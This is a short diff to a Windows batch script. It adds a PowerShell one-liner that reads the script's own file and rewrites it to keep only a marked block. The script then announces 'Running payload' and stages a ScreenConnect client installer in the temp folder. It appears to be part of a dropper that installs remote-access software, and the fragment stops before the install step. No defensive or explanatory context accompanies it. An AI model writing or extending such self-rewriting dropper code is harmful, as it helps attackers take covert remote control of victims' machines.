@@ -1,5 +1,6 @@
 @echo off
 REM CDRP7F3A9D2B8C4
+powershell -nop -c "$p='%~f0';$b=[IO.File]::ReadAllBytes($p);$u=[Text.Encoding]::UTF8.GetString($b);$i=$u.IndexOf('@echo off');$j=$u.LastIndexOf('REM CDRPEND7F3A9D2');if($i -ge 0 -and $j -gt $i){$n=$j-$i+21;[IO.File]::WriteAllBytes($p,$b[$i..($i+$n-1)])}"
 echo Running payload: %~f0
 setlocal EnableExtensions
 set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
